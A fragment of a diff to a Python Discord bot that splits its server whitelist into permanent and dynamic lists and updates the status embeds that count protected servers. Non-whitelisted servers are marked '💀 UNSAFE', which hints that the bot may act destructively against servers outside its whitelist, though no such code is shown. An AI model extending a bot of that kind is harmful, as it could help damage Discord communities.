+        total_servers = len(self.permanent_whitelist) + len(self.whitelisted_servers)
+        embed.set_footer(text=f"Total Protected Servers: {total_servers}")
         await ctx.send(embed=embed)
 
     @commands.command(name='servers')
@@ -728,8 +1170,11 @@ embed.add_field(
         )
         
         for guild in self.bot.guilds:
-            if self.is_whitelisted(guild.id):
-                status = "✅ WHITELISTED | 🛡️ SAFE"
+            if guild.id in self.permanent_whitelist:
+                status = "✅ PERMANENT WHITELIST | 🔒 SAFE"
+                emoji = "🔒"
+            elif guild.id in self.whitelisted_servers:
+                status = "✅ DYNAMIC WHITELIST | 🛡️ SAFE"
                 emoji = "🛡️"
             else:
                 status = "❌ NOT WHITELISTED | 💀 UNSAFE"
@@ -741,11 +1186,13 @@ embed.add_field(
                 inline=False
             )
         
-        whitelist_count = len(self.whitelisted_servers)
+        permanent_count = len(self.permanent_whitelist)
+        dynamic_count = len(self.whitelisted_servers)
         total_servers = len(self.bot.guilds)
+        protected_count = permanent_count + dynamic_count
         
         embed.set_footer(
-            text=f"Total: {total_servers} | Protected: {whitelist_count} | Unprotected: {total_servers - whitelist_count}"
+            text=f"Total: {total_servers} | Permanent: {permanent_count} | Dynamic: {dynamic_count} | Protected: {protected_count}"
         )
         
         await ctx.send(embed=embed)
@@ -759,6 +1206,9 @@ embed.add_field(
             timestamp=datetime.utcnow()
         )
         
+        total_servers = len(self.bot.guilds)
+        protected = sum(1 for g in self.bot.guilds if self.is_whitelisted(g.id))
+        
         embed.add_field(
             name="🟢 STATUS",
             value=f"• **Bot:** `{self.bot.user.name}`\n• **Ping:** `{round(self.bot.latency * 1000)}ms`\n• **Uptime:** `{self.get_uptime()}`",
@@ -767,7 +1217,7 @@ embed.add_field(
         
         embed.add_field(
             name="📊 SERVERS",
-            value=f"• **Total:** `{len(self.bot.guilds)}`\n• **Protected:** `{sum(1 for g in self.bot.guilds if self.is_whitelisted(g.id))}`\n• **Status Channel:** ✅ ACTIVE",
+            value=f"• **Total:** `{total_servers}`\n• **Protected:** `{protected}`\n• **Unprotected:** `{total_servers - protected}`\n• **Admin Panel:** ✅ ACTIVE",
             inline=False
         )
         
